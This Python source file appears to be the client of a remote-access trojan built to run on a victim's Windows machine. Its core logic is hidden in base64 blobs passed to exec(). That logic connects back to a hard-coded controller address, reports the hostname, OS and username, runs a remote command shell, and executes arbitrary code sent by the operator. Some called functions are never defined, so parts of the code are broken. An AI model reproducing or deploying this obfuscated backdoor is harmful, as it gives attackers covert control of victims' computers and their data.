
import socket, os, sys, platform, time, ctypes,  webbrowser, sqlite3, pyscreeze, threading, wmi
import win32api, winerror, win32event, win32crypt
import pyautogui
import requests,subprocess
from shutil import copyfile
from winreg import *
import cv2
import numpy as np
import socket
import sys
import pickle
import struct
from threading import Thread
from zlib import compress
import time
import pygame, webbrowser as browser
import urllib.request
import json
import platform
import uuid
import winreg

from mss import mss


#Client ---> runs on target

from urllib import request, parse
import subprocess
import time
import os





http = 8081

#set remote ip 
strHost = "192.168.1.104"

# strHost = socket.gethostbyname("")
intPort = http






strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ["TEMP"]  # get temp path
APPDATA = os.environ["APPDATA"]

intBuff = 10024

exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('CgojIGZ1bmN0aW9uIHRvIHByZXZlbnQgbXVsdGlwbGUgaW5zdGFuY2VzCm11dGV4ID0gd2luMzJldmVudC5DcmVhdGVNdXRleChOb25lLCAxLCAiUEFfbXV0ZXhfeHA0IikKaWYgd2luMzJhcGkuR2V0TGFzdEVycm9yKCkgPT0gd2luZXJyb3IuRVJST1JfQUxSRUFEWV9FWElTVFM6CiBtdXRleCA9IE5vbmUKIHN5cy5leGl0KDApCgoKCgoKZGVmIHNlcnZlcl9jb25uZWN0KCk6CiBnbG9iYWwgb2JqU29ja2V0CiB3aGlsZSBUcnVlOiAgIyBpbmZpbml0ZSBsb29wIHVudGlsIHNvY2tldCBjYW4gY29ubmVjdAogICAgIHRyeToKICAgICAgICAgb2JqU29ja2V0ID0gc29ja2V0LnNvY2tldCgpCiAgICAgICAgIG9ialNvY2tldC5jb25uZWN0KChzdHJIb3N0LCBpbnRQb3J0KSkKICAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgICB0aW1lLnNsZWVwKDUpICAjIHdhaXQgNSBzZWNvbmRzIHRvIHRyeSBhZ2FpbgogICAgIGVsc2U6IGJyZWFrCgogc3RyVXNlckluZm8gPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKSArICJgLCIgKyBwbGF0Zm9ybS5zeXN0ZW0oKSArICIgIiArIHBsYXRmb3JtLnJlbGVhc2UoKSAgKyBcCiAgICAgICAgICAgICAgICJgLCIgKyBvcy5lbnZpcm9uWyJVU0VSTkFNRSJdCiBzZW5kKHN0ci5lbmNvZGUoc3RyVXNlckluZm8pKQoKIyBmdW5jdGlvbiB0byByZXR1cm4gZGVjb2RlZCB1dGYtOApkZWNvZGVfdXRmOCA9IGxhbWJkYSBkYXRhOiBkYXRhLmRlY29kZSgidXRmLTgiKQoKIyBmdW5jdGlvbiB0byByZWNlaXZlIGFuZCBkZWNyeXB0IGRhdGEKcmVjdiA9IGxhbWJkYSBidWZmZXI6IG9ialNvY2tldC5yZWN2KGJ1ZmZlcikKCiMgZnVuY3Rpb24gdG8gc2VuZCBlbmNyeXB0ZWQgZGF0YQpzZW5kID0gbGFtYmRhIGRhdGE6IG9ialNvY2tldC5zZW5kKGRhdGEpCgpzZXJ2ZXJfY29ubmVjdCgpCgoKCgpkZWYgcmVjdmFsbChidWZmZXIpOiAgIyBmdW5jdGlvbiB0byByZWNlaXZlIGxhcmdlIGFtb3VudHMgb2YgZGF0YQogYnl0RGF0YSA9IGIiIgogd2hpbGUgVHJ1ZToKICAgICBieXRQYXJ0ID0gcmVjdihidWZmZXIpCiAgICAgaWYgbGVuKGJ5dFBhcnQpID09IGJ1ZmZlcjoKICAgICAgICAgcmV0dXJuIGJ5dFBhcnQKICAgICBieXREYXRhICs9IGJ5dFBhcnQKICAgICBpZiBsZW4oYnl0RGF0YSkgPT0gYnVmZmVyOgogICAgICAgICByZXR1cm4gYnl0RGF0YQoKCgogICAgIA==')[0]))




def srt(srt): 
             
         print(srt)
         exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')(srt)[0]))

         
         

    
 
 
 











def command_shell(): # remote cmd shell
 exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCwgb3MsIHN5cywgcGxhdGZvcm0sIHRpbWUsIGN0eXBlcywgIHdlYmJyb3dzZXIsIHNxbGl0ZTMsIHB5c2NyZWV6ZSwgdGhyZWFkaW5nLCB3bWkKaW1wb3J0IHdpbjMyYXBpLCB3aW5lcnJvciwgd2luMzJldmVudCwgd2luMzJjcnlwdAppbXBvcnQgcHlhdXRvZ3VpCmltcG9ydCByZXF1ZXN0cyxzdWJwcm9jZXNzCmZyb20gc2h1dGlsIGltcG9ydCBjb3B5ZmlsZQpmcm9tIHdpbnJlZyBpbXBvcnQgKgoKCgoKCnN0ckN1cnJlbnREaXIgPSBzdHIob3MuZ2V0Y3dkKCkpCgpzZW5kKHN0ci5lbmNvZGUoc3RyQ3VycmVudERpcikpCgp3aGlsZSBUcnVlOgogc3RyRGF0YSA9IGRlY29kZV91dGY4KHJlY3YoaW50QnVmZikpCgogaWYgc3RyRGF0YSA9PSAiZ29iYWNrIjoKICAgICBvcy5jaGRpcihzdHJDdXJyZW50RGlyKSAgIyBjaGFuZ2UgZGlyZWN0b3J5IGJhY2sgdG8gb3JpZ2luYWwKICAgICBicmVhawoKIGVsaWYgc3RyRGF0YVs6Ml0ubG93ZXIoKSA9PSAiY2QiIG9yIHN0ckRhdGFbOjVdLmxvd2VyKCkgPT0gImNoZGlyIjoKICAgICBvYmpDb21tYW5kID0gc3VicHJvY2Vzcy5Qb3BlbihzdHJEYXRhICsgIiAmIGNkIiwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFLCBzaGVsbD1UcnVlKQogICAgIGlmIChvYmpDb21tYW5kLnN0ZGVyci5yZWFkKCkpLmRlY29kZSgidXRmLTgiKSA9PSAiIjogICMgaWYgdGhlcmUgaXMgbm8gZXJyb3IKICAgICAgICAgc3RyT3V0cHV0ID0gKG9iakNvbW1hbmQuc3Rkb3V0LnJlYWQoKSkuZGVjb2RlKCJ1dGYtOCIpLnNwbGl0bGluZXMoKVswXSAgIyBkZWNvZGUgYW5kIHJlbW92ZSBuZXcgbGluZQogICAgICAgICBvcy5jaGRpcihzdHJPdXRwdXQpICAjIGNoYW5nZSBkaXJlY3RvcnkKCiAgICAgICAgIGJ5dERhdGEgPSBzdHIuZW5jb2RlKCJcbiIgKyBzdHIob3MuZ2V0Y3dkKCkpICsgIj4iKSAgIyBvdXRwdXQgdG8gc2VuZCB0aGUgc2VydmVyCgogZWxpZiBsZW4oc3RyRGF0YSkgPiAwOgogICAgIG9iakNvbW1hbmQgPSBzdWJwcm9jZXNzLlBvcGVuKHN0ckRhdGEsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwgc2hlbGw9VHJ1ZSkKICAgICBzdHJPdXRwdXQgPSAob2JqQ29tbWFuZC5zdGRvdXQucmVhZCgpICsgb2JqQ29tbWFuZC5zdGRlcnIucmVhZCgpKS5kZWNvZGUoInV0Zi04IiwgZXJyb3JzPSJyZXBsYWNlIikgICMgc2luY2UgY21kIHVzZXMgYnl0ZXMsIGRlY29kZSBpdAoKICAgICBieXREYXRhID0gc3RyLmVuY29kZShzdHJPdXRwdXQgKyAiXG4iICsgc3RyKG9zLmdldGN3ZCgpKSArICI+IikKIGVsc2U6CiAgICAgYnl0RGF0YSA9IHN0ci5lbmNvZGUoIkVycm9yISEhIikKCiBzdHJCdWZmZXIgPSBzdHIobGVuKGJ5dERhdGEpKQogc2VuZChzdHIuZW5jb2RlKHN0ckJ1ZmZlcikpICAjIHNlbmQgYnVmZmVyIHNpemUKIHRpbWUuc2xlZXAoMC4xKQogc2VuZChieXREYXRhKSAgIyBzZW5kIG91dHB1dAo=')[0]))
 

 exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('')[0]))
 








     



















 

#commands here
while True:
 try:
     while True:
         strData = recv(intBuff)
         strData = decode_utf8(strData)

         if strData == "exit":
             objSocket.close()
             sys.exit(0)
         

         
         elif strData[:3] == "srt":
             srt(strData[4:])

         
         elif strData == "kill":
             kill()

         elif strData == "getdata":
              getdata()
            
             
         

             

        


             





 except socket.error:  # if the server closes without warning
     objSocket.close()
     del objSocket
     server_connect()

# eof

 










